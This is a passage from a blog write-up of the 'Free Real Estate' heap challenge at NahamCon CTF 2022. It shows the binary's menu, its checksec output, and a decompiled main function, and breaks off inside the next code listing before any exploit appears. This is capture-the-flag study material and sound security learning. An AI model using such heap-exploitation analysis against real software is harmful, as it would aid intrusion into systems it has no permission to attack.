<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>NahamCon CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="NahamCon CTF 2022" />
<meta property="og:description" content="Writeup for NahamCon CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/nahamcon-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-01T08:12:50+07:00" />
<meta property="article:modified_time" content="2022-05-01T08:12:50+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="NahamCon CTF 2022"/>
<meta name="twitter:description" content="Writeup for NahamCon CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.95.0" />


  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />

 
    



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">‚Üê</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">NahamCon CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-05-01 08:12:50 &#43;0700 WIB">May 1, 2022</time>
        <span class="split">
          ¬∑
        </span>
        <span>
          5851 words
        </span>
        <span class="split">
          ¬∑
        </span>
        <span>
          28 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/TarulZc.png" alt=""  />
</p>
I tried to spend my saturday to do the NahamCon CTF 2022, but I had a lot of events during the day, so I plan to look at 3-5 problems. At the end, I could only solve one problem that I looked first, because it turns out to be pretty hard for me. I&rsquo;m still new to this, so I would like to apologize in advance if there is wrong or misleading information stated in here. Feel free to contact me if you find mistakes in my writeup. Cheers üçª</p>
<h2 id="free-real-estate">Free Real Estate <a href="#free-real-estate" class="anchor">#</a></h2>
<h3 id="intro">Intro <a href="#intro" class="anchor">#</a></h3>
<p>We were given two files, the <code>Dockerfile</code> and a binary called <code>free_real_estate</code>. Let&rsquo;s try to run the binary first.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./free_real_estate
</span></span><span style="display:flex;"><span>Enter your name: lmao
</span></span><span style="display:flex;"><span>Hello: lmao!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>1<span style="color:#555">]</span> Show property
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>2<span style="color:#555">]</span> Add property
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>3<span style="color:#555">]</span> Remove property
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>4<span style="color:#555">]</span> Edit property
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>5<span style="color:#555">]</span> Change name
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>6<span style="color:#555">]</span> Exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Seems like we will be working with <code>heap</code> (Well, the name of the challenge is free though)</p>
<h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
<p>Let&rsquo;s grab the libc file first by turning up the docker based on the given <code>Dockerfile</code>. Checking on the libc file, the glibc is <code>glibc-2.31</code>, which mean we couldn&rsquo;t do double free.</p>
<p>Checksec of the binary:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, turning up our decompiler, let&rsquo;s try to decompile it and breakdown some important functions.</p>
<h4 id="main">main <a href="#main" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">bool</span> bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>pcVar2;
</span></span><span style="display:flex;"><span>  undefined4 uVar3;
</span></span><span style="display:flex;"><span>  size_t sVar4;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  bVar1 <span style="color:#555">=</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>  setbuf(stdin,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdout,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Enter your name: &#34;</span>);
</span></span><span style="display:flex;"><span>  username._8_8_ <span style="color:#555">=</span> getline((<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)username,(size_t <span style="color:#555">*</span>)(username <span style="color:#555">+</span> <span style="color:#f60">8</span>),stdin);
</span></span><span style="display:flex;"><span>  pcVar2 <span style="color:#555">=</span> username._0_8_;
</span></span><span style="display:flex;"><span>  sVar4 <span style="color:#555">=</span> strcspn(username._0_8_,<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  pcVar2[sVar4] <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  username._8_8_ <span style="color:#555">=</span> username._8_8_ <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Hello: %s!</span><span style="color:#c30;font-weight:bold">\n\n</span><span style="color:#c30">&#34;</span>,username._0_8_);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">!</span>bVar1) {
</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#555">=</span> menu();
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span>(uVar3) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">0</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (property <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;You do not own any property.&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        show_property();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (property <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        add_property();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;You already own property.&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (property <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;You do not own any property.&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        remove_property();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (property <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;You do not own any property.&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        edit_property();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      change_name();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#555">=</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so we have like 5 functions that we can use, and we can only add property only after removing it.</p>
<h4 id="add_property">add_property <a href="#add_property" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
